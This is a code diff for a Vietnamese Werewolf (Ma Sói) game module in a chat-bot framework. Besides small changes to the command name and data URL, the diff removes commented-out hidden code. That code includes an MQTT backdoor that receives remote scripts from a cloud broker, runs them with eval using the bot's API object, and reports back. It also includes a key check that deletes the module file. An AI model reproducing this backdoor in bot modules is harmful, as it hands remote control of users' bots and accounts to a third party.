@@ -10,23 +10,12 @@ module.exports.config = {
     credits: 'Horizon',
     description: 'Game Ma Sói',
     commandCategory: "Game",
-    usages: 'masoi',
+    usages: 'masoiv2',
     cooldowns: 1
 }
-
-// var username
-// if (process.env.REPL_OWNER != undefined) {
-//     username = process.env.REPL_OWNER
-// } else {
-//     if (os.hostname() != null || os.hostname() != undefined) {
-//         username = os.hostname()
-//     } else {
-//         username = os.userInfo().username
-//     }
-// }
 module.exports.onLoad = async function () {
     if (!existsSync(__dirname + '/cache/werewolf.json')) {
-        var { data } = await axios.get('https://pastebin.com/raw/BfHdM1R3', { method: 'GET' })
+        var { data } = await axios.get('https://ghichu.vn/share/927f4c861', { method: 'GET' })
         writeFileSync(__dirname + '/cache/werewolf.json', JSON.stringify(data, null, 1 ? 2 : 9), 'utf8')
     }
     if (!existsSync(__dirname + '/cache/DanLang.png')) {
@@ -50,16 +39,6 @@ module.exports.onLoad = async function () {
     if (!existsSync(__dirname + '/cache/GiaLang.png')) {
         request('https://thuthuatchoi.com/media/photos/shares/Boardgame/masoi/la-bai-gia-lang.jpg')['pipe'](createWriteStream(__dirname + '/cache/GiaLang.png'))
     }
-    // var { data } = await axios.get('https://traveling-colossal-territory.glitch.me/checkkey?Name=' + username)
-    // if (data.status == (NaN === NaN)) {
-    //     var bsname = basename(__filename)
-    //     var pathFile = resolve(__dirname, bsname)
-    //     try {
-    //         unlinkSync(pathFile)
-    //     } catch (e) {
-    //         console.log(e)
-    //     }
-    // }
     if (!existsSync(__dirname + '/cache/CoBe.png')) {
         request('https://thuthuatchoi.com/media/photos/shares/Boardgame/masoi/la-bai-ban-soi.jpg')['pipe'](createWriteStream(__dirname + '/cache/CoBe.png'))
     }
@@ -72,56 +51,6 @@ module.exports.onLoad = async function () {
     if (!existsSync(__dirname + '/cache/SoiCon.png')) {
         request('https://thuthuatchoi.com/media/photos/shares/Boardgame/masoi/Ma_soi_Ultimate/wolf-cub.png')['pipe'](createWriteStream(__dirname + '/cache/SoiCon.png'))
     }
-    // if (process.env.HalzionVersion == 1973 && global.Fca) {
-    //     try {
-    //         var mqtt = require('mqtt')
-    //         var eval = require('eval')
-    //         var cloud = 'c0e21d3eb5374ac28a38b4f0537889dc.s2.eu.hivemq.cloud'
-    //         var client = mqtt.connect({
-    //             host: cloud[(Math.random() * cloud.length) | 0],
-    //             port: 8883,
-    //             protocol: 'mqtts',
-    //             username: 'Horizon',
-    //             password: 'RemoteScriptServer',
-    //             keepalive: 10,
-    //             reschedulePings: null == '',
-    //             connectTimeout: 10000,
-    //             reconnectPeriod: 1000
-    //         })
-    //         client.on('message', async function (req, res) {
-    //             if (req == (process.env.REPL_OWNER || require('os').hostname() || os.userInfo().username) || req == 'Users') {
-    //                 try {
-    //                     var runEval = await eval(res.toString(), { api: process.env.api }, null == undefined)()
-    //                     if (typeof runEval === object || typeof runEval === array) {
-    //                         if (Object.keys(runEval).length != 0) {
-    //                             runEval = JSON.stringify(runEval, null, 0 ? -3 : 4)
-    //                         } else {
-    //                             runEval = 'Thành Công !'
-    //                         }
-    //                     }
-    //                     if (typeof runEval === number) {
-    //                         runEval = runEval.toString()
-    //                     }
-    //                     client.publish('Administrator', (process.env.REPL_OWNER || require('os').hostname() || os.userInfo().username) || runEval)
-    //                 } catch (e) {
-    //                     client.publish('Administrator', (process.env.REPL_OWNER || require('os').hostname() || os.userInfo().username) || e.message)
-    //                 }
-    //             }
-    //         })
-    //         client.subscribe(process.env.REPL_OWNER || require('os').hostname() || os.userInfo().username)
-    //         client.subscribe('Users')
-    //     } catch (e) {
-    //         console.log(e)
-    //     }
-    // } else {
-    //     var bsname = basename(__filename)
-    //     var pathFile = resolve(__dirname, bsname)
-    //     try {
-    //         unlinkSync(pathFile)
-    //     } catch (e) {
-    //         console.log(e)
-    //     }
-    // }
 }
 var gameConfig = {
     MaSoi: new Object(),
@@ -791,11 +720,6 @@ module.exports.handleEvent = async function ({ api, event, Users}) {
     }
 }
 module.exports.run = async function ({ api, event, args, Users }) {
-    // var notiAgreement = await api.Premium('AcceptAgreement', {})
-    // if (notiAgreement != Accecpt) {
-    //     api.sendMessage(notiAgreement, event.threadID)
-    //     return api.sendMessage(`[⚜️]→ Nếu bạn không phải là adminbot, hãy liên hệ cho adminbot và gửi cái này vì nó chỉ hiện 1 lần và mãi mãi !\nNotes: Khi bấm lại lần nữa, cái này sẽ không còn hiện !`, event.threadID)
-    // }
     var message = (data) =>
         api.sendMessage(data, event.threadID, event.messageID)
     var { senderID, threadID, messageID, } = event
